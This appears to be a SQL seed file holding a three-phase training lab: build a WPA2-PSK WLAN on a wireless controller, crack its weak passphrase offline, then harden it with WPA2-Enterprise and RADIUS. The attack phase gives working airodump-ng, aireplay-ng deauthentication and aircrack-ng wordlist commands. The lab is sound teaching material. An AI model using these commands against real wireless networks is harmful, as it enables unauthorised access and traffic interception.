-- ═══════════════════════════════════════════════════════════════════
-- Lab (id=42) — WLAN Configuration : full content (Vol 2 · Ch 21)
-- ═══════════════════════════════════════════════════════════════════

UPDATE labs
SET short_desc = 'Stand up a real WLC-managed WLAN with a passphrase that looks reasonable — then crack it offline in under a minute because "reasonable" and "strong" were never the same thing.'
WHERE id = 42;

-- ─────────────────────────── BUILD ───────────────────────────
UPDATE lab_phases SET
  title = 'Stand Up the WLAN',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 1 of 3</span>
<h3>Stand Up the WLAN</h3>
<p>A Wireless LAN Controller centralizes everything: every AP it manages, every WLAN profile, every security policy, all from one place. That's operationally great and, as you'll see in Phase 2, makes the passphrase you pick the single thing standing between "convenient" and "compromised."</p>
</div>

<div class="stats">
<span class="chip xp">✦ 550 XP</span>
<span class="chip diff">◆ Difficulty: ★★☆☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: WLC dynamic interfaces · WLAN profiles · WPA2-PSK configuration</span>
</div>

## Your arsenal

| Component | Role |
|---|---|
| WLC | Centralized controller managing the WLAN |
| AP | Broadcasts the SSID on the WLC's behalf |
| Client | A laptop/phone joining normally |
| KALI | Attacker, in range, listening |

## Step 1 — Create the dynamic interface

```
config interface create staff-net 20
config interface address dynamic-interface staff-net 10.20.0.1 255.255.255.0 10.20.0.254
```

## Step 2 — Create the WLAN and bind it

```
config wlan create 1 StaffWiFi StaffWiFi
config wlan interface 1 staff-net
```

## Step 3 — Set security — WPA2-PSK, with a passphrase that "looks" fine

```
config wlan security wpa akm psk enable 1
config wlan security wpa akm psk set-key ascii Company123! 1
config wlan enable 1
```
<div class="callout warn">
<p><code>Company123!</code> has a capital letter, lowercase letters, a number, and a symbol — it would pass most corporate "strong password" checklists. It is also exactly the shape of password a cracking wordlist is built to guess first.</p>
</div>

## Step 4 — Confirm a client can join normally

```
! from a client device
connect to SSID "StaffWiFi", enter Company123!
```
Confirm it associates and gets an IP from the `staff-net` interface.

<div class="achievement">
<span class="medal">📶</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">On the Air — a real WLAN, a real client, a passphrase that feels secure</span></span>
</div>

**Next:** Phase 2 — "feels secure" and "is secure" are about to have a very public disagreement.
$md$
WHERE lab_id = 42 AND phase = 'build';

-- ─────────────────────────── ATTACK ───────────────────────────
UPDATE lab_phases SET
  title = 'Crack the Passphrase Offline',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 2 of 3</span>
<h3>Crack the Passphrase Offline</h3>
<p>WPA2-PSK's 4-way handshake (from the Wireless Fundamentals lab) doesn't transmit the passphrase — but it does transmit enough cryptographic material to let an attacker test guesses against it, completely offline, with no further contact with the network at all. If the real passphrase is anywhere in a common wordlist, this ends quickly.</p>
</div>

<div class="callout danger">
<p><strong>Rules of engagement:</strong> capture and crack only against your own GNS3/lab WLAN.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 750 XP</span>
<span class="chip diff">◆ Difficulty: ★★★☆☆</span>
<span class="chip time">◷ ~10 min</span>
<span class="chip loot">⚿ Loot: offline WPA2 cracking · wordlist attacks · passphrase entropy</span>
</div>

## Step 1 — Capture the handshake

Same technique as the Wireless Fundamentals lab:

```
sudo airodump-ng wlan0mon --bssid <WLC-BSSID> --channel <CHANNEL> -w /tmp/staffcrack
sudo aireplay-ng --deauth 5 -a <WLC-BSSID> wlan0mon
```

## Step 2 — Crack it against a common wordlist

```
sudo apt install -y wordlists
gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
aircrack-ng /tmp/staffcrack-01.cap -w /usr/share/wordlists/rockyou.txt
```

<div class="callout tip">
<p><strong>💥 That's the moment.</strong> <code>KEY FOUND! [ Company123! ]</code> — a passphrase that would pass a corporate complexity checklist just fell to a publicly available wordlist in seconds, because complexity rules check for character <em>variety</em>, not whether the actual phrase is common. Every client that has ever joined this WLAN is now readable to anyone who captures their traffic.</p>
</div>

<div class="achievement">
<span class="medal">🔓</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Key Found — the whole WLAN's security was one guessable phrase</span></span>
</div>

**Next:** Phase 3 — stop relying on a shared secret that everyone on staff has to know, remember, and never leak.
$md$
WHERE lab_id = 42 AND phase = 'attack';

-- ─────────────────────────── HARDEN ───────────────────────────
UPDATE lab_phases SET
  title = 'Remove the Shared Secret Entirely',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 3 of 3</span>
<h3>Remove the Shared Secret Entirely</h3>
<p>Every WPA2-PSK network has the same structural weakness: one passphrase, shared by everyone, crackable offline the moment someone captures a handshake. The real fix for anything beyond a small guest network is to stop using a shared secret at all — WPA2/3-Enterprise gives each user their own credential, validated live against a RADIUS server, with nothing static for an attacker to crack offline.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 850 XP</span>
<span class="chip diff">◆ Difficulty: ★★★★☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: WPA2/3-Enterprise · RADIUS-backed WLANs · WLC management hardening</span>
</div>

<ul class="objectives">
<li>Move the staff WLAN to WPA2-Enterprise (802.1X + RADIUS)</li>
<li>Isolate any remaining PSK-based network (guest Wi-Fi) onto its own restricted VLAN</li>
<li>Lock down the WLC's own management access</li>
<li>Re-run the crack → there's no shared passphrase left to capture</li>
</ul>

## Fix 1 — Move to WPA2-Enterprise

```
config wlan security wpa akm psk disable 1
config wlan security wpa akm 802.1x enable 1
config wlan radius_server auth add 1 <RADIUS-IP> 1812 ascii <shared-secret>
```
Every user authenticates with their own credentials against RADIUS. There's no single passphrase whose capture-and-crack compromises every client at once.

## Fix 2 — Guest Wi-Fi, if you keep PSK anywhere, stays isolated

```
config wlan interface guest-net 2
config wlan security wpa akm psk enable 2
! guest-net routes ONLY to the internet, never to internal VLANs
```
A cracked guest passphrase should cost you guest-internet access, not the staff network.

## Fix 3 — Protect the WLC itself

The controller is the single most valuable target here — it manages every AP and every WLAN policy:

```
config network webmode disable
config network secureweb enable
config mgmt-user add <admin> priv-write <strong-unique-password>
```
HTTPS-only management, strong unique administrative credentials — not reused from anywhere else in this network.

## Re-run the attack (the fun part)

```
sudo airodump-ng wlan0mon --bssid <WLC-BSSID> --channel <CHANNEL>
```

<div class="callout tip">
<p>The handshake you'd capture now is a per-user 802.1X exchange tied to a live RADIUS validation — there's no static passphrase embedded in it to crack offline. <code>aircrack-ng</code> against this capture has nothing to find, because the thing it's designed to find no longer exists.</p>
</div>

## Prove it to the grader

```
show wlan 1                             ! security shows 802.1X, not PSK
show wlan 2                             ! guest WLAN present, isolated
show network summary                    ! secureweb (HTTPS) enabled
```

<div class="achievement">
<span class="medal">🛡️</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Nothing to Crack — every user proves who they are, nobody shares a secret</span></span>
</div>

<div class="mission">
<span class="tag">✔ LAB COMPLETE</span>
<h3>WLAN Configuration — cleared</h3>
<p>You stood up a WLAN with a passphrase that would pass most corporate checklists, then watched it fall to a public wordlist in seconds because "complex-looking" isn't the same as "hard to guess." Moving to WPA2-Enterprise didn't just make the passphrase stronger — it removed the shared secret from the equation entirely.</p>
<p><strong>Total: 2150 XP</strong> · Next target: <code>Network Automation &amp; SDN</code>, where centralizing control turns out to cut both ways.</p>
</div>
$md$
WHERE lab_id = 42 AND phase = 'harden';
